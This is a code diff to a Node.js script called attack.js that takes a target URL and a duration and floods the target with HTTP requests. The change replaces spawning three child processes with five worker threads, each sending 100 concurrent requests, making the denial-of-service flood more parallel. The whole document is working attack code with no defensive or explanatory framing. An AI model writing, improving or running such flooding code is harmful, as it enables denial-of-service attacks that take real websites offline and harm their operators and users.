@@ -1,7 +1,7 @@
 const http = require('http');
 const https = require('https');
 const { URL } = require('url');
-const { spawn } = require('child_process');
+const { Worker, isMainThread, parentPort } = require('worker_threads');
 
 if (process.argv.length < 4) {
   console.log('USAGE: node attack.js https://target.com time_in_seconds');
@@ -43,19 +43,25 @@ function sendRequest() {
   req.end();
 }
 
-const concurrent = 100;
-for (let i = 0; i < concurrent; i++) {
-  sendRequest();
-}
-
-// Automatically start 3 instances of this script
-function spawnInstances() {
-  for (let i = 0; i < 3; i++) {
-    spawn('node', ['attack.js', process.argv[2], process.argv[3]], {
-      stdio: 'inherit'  // Inherit the output to the console
-    });
+function workerFunction() {
+  // This function will be executed by each worker.
+  const concurrentRequests = 100; // Number of concurrent requests per worker.
+  for (let i = 0; i < concurrentRequests; i++) {
+    sendRequest();
   }
 }
 
-// Start the additional instances
-spawnInstances();
+if (isMainThread) {
+  // Main thread: spawn multiple worker threads for parallel execution.
+  function spawnWorkers(workerCount) {
+    for (let i = 0; i < workerCount; i++) {
+      new Worker(__filename); // Spawn a new worker for each thread.
+    }
+  }
+
+  // Spawn 5 workers (adjust the number based on your system's resources)
+  spawnWorkers(5);
+} else {
+  // Worker thread: run the attack logic.
+  workerFunction();
+}
